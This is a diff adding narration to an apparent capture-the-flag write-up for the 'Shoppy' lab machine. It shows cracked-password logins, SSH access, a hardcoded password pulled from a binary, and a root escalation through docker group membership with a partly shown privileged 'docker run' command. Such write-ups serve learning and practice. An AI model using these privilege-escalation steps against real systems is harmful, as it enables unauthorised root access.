@@ -149,8 +149,14 @@ Navigating to the site brings us another login.
 
 ![image](https://user-images.githubusercontent.com/105310322/192318703-c2ad5e68-8e51-46df-94c1-29b628552852.png)
 
+Inputting Josh as the username and the password we cracked ```remembermethisway``` get us inside.
+
+Navigating around we find a password listed. Nice lets try that in SSH.
 
 ![image](https://user-images.githubusercontent.com/105310322/192319017-5dfd3369-63f1-48e4-ace0-10c184737abd.png)
+
+
+Whoo, we are finally on the box!
 
 ```console
 └──╼ [★]$ ssh jaeger@10.129.69.87
@@ -170,9 +176,18 @@ permitted by applicable law.
 manpath: can't set the locale; make sure $LC_* and $LANG are correct
 jaeger@shoppy:~$ 
 ```
+```console
+jaeger@shoppy:/home/deploy$ cat /home/jaeger/user.txt 
+f6e8****************************
+```
 
+For the next step if we do ```sudo -l``` it reveals that we can run password-manager as root but there were not any immediate exploits for this. However if we cat this file we find a simple password ```Sample```
+
+```
 �u��}�u2�}���u)H�=�.�����H�u,H�5�.H��+H���/������UH���������]��AWL�=W)AVI��AUI��ATA��UH�-P)SL)�H�����H��t�L��L��D��A��H��H9�u�H�[]A\A]A^A_��H�H��Welcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !cat /home/deploy/creds.txtAccess denied! This incident will be reported !@����0����@���h%����
+```
 
+Doing gets us another login for deploy! and we can run bash for a cleaner shell.
 
 ```console
 jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager
@@ -202,16 +217,26 @@ Administrator. It usually boils down to these three things:
 [sudo] password for deploy: 
 Sorry, user deploy may not run sudo on shoppy.
 ```
+For the next step I ran linpeas on the machine and I got that Deploy is part of the docker group.
 
+If we can leverage docker we can easily gain root.
+
+```
                                ╔═══════════════════╗
 ═══════════════════════════════╣ Basic information ╠═══════════════════════════════                              
                                ╚═══════════════════╝                                                             
 OS: Linux version 5.10.0-18-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.140-1 (2022-09-02)
 User & Groups: uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
+```
 
-
+Hacktricks is amazing and has good stuff on docker. As well as our command string for the exploit.
 
 https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#docker-group
+
+
+Do a quick check for the type of docker image and then add that into our command.
+
+Voila we have root and the flag!
 
 ```
 deploy@shoppy:/tmp$ docker images
@@ -222,3 +247,4 @@ deploy@shoppy:/tmp$ docker run --rm -it --pid=host --net=host --privileged -v /:
 root@shoppy:/# cat /root/root.txt
 c5a7****************************
 ```
+GG!
